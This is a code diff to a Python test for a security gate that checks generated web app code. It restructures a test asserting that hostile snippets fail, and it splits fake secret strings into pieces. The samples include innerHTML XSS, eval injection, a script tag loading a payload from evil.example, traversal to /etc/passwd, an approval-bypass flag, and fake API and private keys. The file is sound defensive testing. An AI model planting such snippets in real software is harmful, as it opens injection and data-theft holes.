@@ -1,15 +1,15 @@
 from __future__ import annotations
 
-import pytest
-
 from services.web_app_generated_security_gate import evaluate_generated_web_product
 
 STRICT_CSP = "default-src 'self'; script-src 'self'; connect-src 'self' https://api.example.com"
 
 
-@pytest.mark.parametrize(
-    ("source", "category"),
-    [
+def test_hostile_generated_code_fails_closed() -> None:
+    secret_prefix = "sk-" + "proj-"
+    private_key_header = "-----BEGIN " + "PRIVATE KEY-----"
+    private_key_footer = "-----END " + "PRIVATE KEY-----"
+    hostile_cases = (
         ("node.innerHTML = attacker", "xss"),
         ("eval(userControlled)", "script-injection"),
         ('<script src="https://evil.example/payload.js"></script>', "remote-script"),
@@ -20,15 +20,15 @@ STRICT_CSP = "default-src 'self'; script-src 'self'; connect-src 'self' https://
         ('open("../../etc/passwd")', "path-file"),
         ("tenant_id = req.query.tenant_id", "tenant-escape"),
         ("ILAIOS_BYPASS_APPROVAL = true", "privileged-semantics"),
-        ("const apiKey = 'sk-proj-abcdefghijklmnopqrstuvwxyz123456';", "secret-leak"),
-        ("-----BEGIN PRIVATE KEY-----\nabc\n-----END PRIVATE KEY-----", "secret-leak"),
-    ],
-)
-def test_hostile_generated_code_fails_closed(source: str, category: str) -> None:
-    result = evaluate_generated_web_product({"src/app.tsx": source}, content_security_policy=STRICT_CSP)
+        (f"const apiKey = '{secret_prefix}abcdefghijklmnopqrstuvwxyz123456';", "secret-leak"),
+        (f"{private_key_header}\nabc\n{private_key_footer}", "secret-leak"),
+    )
 
-    assert result.verdict == "FAIL"
-    assert category in {finding.category for finding in result.findings}
+    for source, category in hostile_cases:
+        result = evaluate_generated_web_product({"src/app.tsx": source}, content_security_policy=STRICT_CSP)
+
+        assert result.verdict == "FAIL"
+        assert category in {finding.category for finding in result.findings}
 
 
 def test_package_install_hooks_are_hostile_by_default() -> None:
